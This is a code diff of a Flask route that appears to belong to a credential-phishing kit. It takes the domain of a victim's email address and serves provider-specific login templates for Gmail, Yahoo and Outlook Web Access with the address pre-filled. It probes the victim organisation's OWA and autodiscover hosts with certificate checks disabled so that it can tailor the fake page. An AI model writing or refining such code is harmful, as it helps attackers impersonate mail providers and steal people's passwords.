@@ -180,33 +180,31 @@ def route2():
         
         app.logger.info(f"Extracted domain: {session['ins']}")  # Flask logging
 
+        # Direct mappings for known email domains
         if session['ins'] == "gmail.com":
             return render_template('gowa.html', eman=session.get('eman'), ins=session.get('ins'))
-        if session['ins'] == "yahoo.com":
+        elif session['ins'] == "yahoo.com":
             return render_template('Yahoo.html', eman=session.get('eman'), ins=session.get('ins'))
 
+        # Construct OWA URLs
         owa_url = urljoin(f"https://owa.{session['ins']}", "/owa/#path=/mail")
         autodiscover_url = urljoin(f"https://autodiscover.{session['ins']}", "/owa/#path=/mail/search")
 
-        # Check which URL is accessible and render OWA page if found
-        try:
-            response = requests.get(owa_url, verify=False)
-            if response.status_code == 200:
-                app.logger.info(f"OWA URL is accessible: {owa_url}")
-                return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins'), owa_url=owa_url)
-        except requests.exceptions.RequestException:
-            app.logger.warning(f"OWA URL not accessible: {owa_url}")
+        # Try accessing OWA URLs
+        for url in [owa_url, autodiscover_url]:
+            try:
+                response = requests.get(url, verify=False, timeout=3)
+                if response.status_code == 200:
+                    app.logger.info(f"Accessible URL found: {url}")
+                    return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins'), owa_url=url)
+            except requests.exceptions.RequestException:
+                app.logger.warning(f"URL not accessible: {url}")
 
-        try:
-            response = requests.get(autodiscover_url, verify=False)
-            if response.status_code == 200:
-                app.logger.info(f"Autodiscover URL is accessible: {autodiscover_url}")
-                return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins'), owa_url=autodiscover_url)
-        except requests.exceptions.RequestException:
-            app.logger.warning(f"Autodiscover URL not accessible: {autodiscover_url}")
-
+        # If no valid OWA URL, fallback to general gowa.html
         return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins'))
-return render_template("index.html", eman=session.get('eman'), ins=session.get('ins'))
+
+    # If no valid web_param, redirect to index.html
+    return render_template("index.html", eman=session.get('eman'), ins=session.get('ins'))
 
 @app.route("/first", methods=['POST'])
 def first():
